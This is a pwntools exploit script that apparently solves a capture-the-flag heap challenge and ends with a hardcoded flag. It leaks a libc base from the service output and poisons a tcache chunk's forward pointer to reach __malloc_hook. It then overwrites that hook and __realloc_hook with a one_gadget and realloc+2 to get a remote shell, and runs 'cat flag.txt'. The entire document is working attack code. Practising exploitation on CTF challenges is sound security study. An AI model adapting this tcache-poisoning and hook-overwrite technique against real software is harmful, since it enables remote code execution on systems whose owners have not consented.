#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "0.cloud.chals.io 12053"
remote_service = remote_service.strip().split(" ")
p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
# p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
cmd = lambda x : p.sendlineafter(b'> ', str(x).encode())
sda = lambda x : p.sendafter(b'> ', x)
def debugPID():
	lg("p.pid")
	input()
def getFLAG():
	p.recv()
	sl(b"cat flag.txt")
	flag = ru(b"\n", "drop")
	log.success(flag.decode())

# get_libc_base
ru(b"one_gadget lol 0x")
one_gadget = int(ru(b"\n", "drop"), 16)
libc_base  = (one_gadget - 0xC195) - l.symbols['exit']
lg("one_gadget-libc_base")
malloc_hook  = libc_base + l.symbols['__malloc_hook']
lg("one_gadget")
lg("libc_base")

# init_size_of(1000+0x10)
total_size = 1016
cmd(total_size)
cmd(1000)

# Add one chunk before freeing it into tcache
cmd(0)
cmd(1000)
cmd(1)
cmd(2)

# overwrite tcache_chunk's fd with malloc_hook-0x20(realloc_hook-0x18)
# So we can overwrite malloc_hook and realloc_hook at the same time
cmd(3)
cmd(total_size)
target_addr = malloc_hook-0x20
sda((b"a"*1000 + p64(0x411) + p64(target_addr)).ljust(total_size, b"\x00"))

# malloc into target_addr
cmd(0)
cmd(1000)
cmd(0)
cmd(1000)

# malloc_hook  <== &realloc+2
# realloc_hook <== one_gadget
ru(b"What would you like to do?\n")
cmd(3)
pa_len = 0x3e8+0x10+0x3e8+0x3e8
lg("libc_base+l.symbols['realloc']")
one_gadget = libc_base+0x4f3c2
payload = (b"a"*(0x3e8+0x10) + p64(one_gadget) + p64(libc_base+l.symbols['realloc']+2)).ljust(pa_len, b"\x00")
cmd(pa_len)
sda(payload)
sn(b"\n")
p.recv()
sl(b"0")
cmd(1000)

getFLAG()
# shctf{r0und_and_r0und_we_go}

irt()